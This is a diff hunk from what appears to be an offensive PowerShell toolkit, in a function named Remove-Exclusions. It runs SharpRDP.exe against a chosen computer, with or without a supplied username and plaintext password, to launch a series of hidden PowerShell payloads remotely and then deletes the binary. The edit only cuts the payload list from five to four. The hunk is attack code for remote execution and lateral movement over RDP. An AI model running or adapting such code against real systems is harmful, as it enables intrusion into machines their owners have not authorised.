@@ -257,13 +257,11 @@ function Remove-Exclusions {
         if(!$user) { .\SharpRDP.exe computername=$computer command="powershell.exe -windowstyle hidden $Pwn1" ; Write-Host
         .\SharpRDP.exe computername=$computer command="powershell.exe -windowstyle hidden $Pwn2" ; Write-Host
         .\SharpRDP.exe computername=$computer command="powershell.exe -windowstyle hidden $Pwn3" ; Write-Host
-        .\SharpRDP.exe computername=$computer command="powershell.exe -windowstyle hidden $Pwn4" ; Write-Host
-        .\SharpRDP.exe computername=$computer command="powershell.exe -windowstyle hidden $Pwn5" ; Write-Host }
+        .\SharpRDP.exe computername=$computer command="powershell.exe -windowstyle hidden $Pwn4" }
         if($user) { .\SharpRDP.exe computername=$computer username=$user password=$PlainTextPassword command="powershell.exe -windowstyle hidden $Pwn1" ; Write-Host
         .\SharpRDP.exe computername=$computer username=$user password=$PlainTextPassword command="powershell.exe -windowstyle hidden $Pwn2" ; Write-Host
         .\SharpRDP.exe computername=$computer username=$user password=$PlainTextPassword command="powershell.exe -windowstyle hidden $Pwn3" ; Write-Host
-        .\SharpRDP.exe computername=$computer username=$user password=$PlainTextPassword command="powershell.exe -windowstyle hidden $Pwn4" ; Write-Host
-        .\SharpRDP.exe computername=$computer username=$user password=$PlainTextPassword command="powershell.exe -windowstyle hidden $Pwn5" ; Write-Host }
+        .\SharpRDP.exe computername=$computer username=$user password=$PlainTextPassword command="powershell.exe -windowstyle hidden $Pwn4" }
         del .\SharpRDP.exe }
         
         'M' { Show-Banner ; Show-Modules
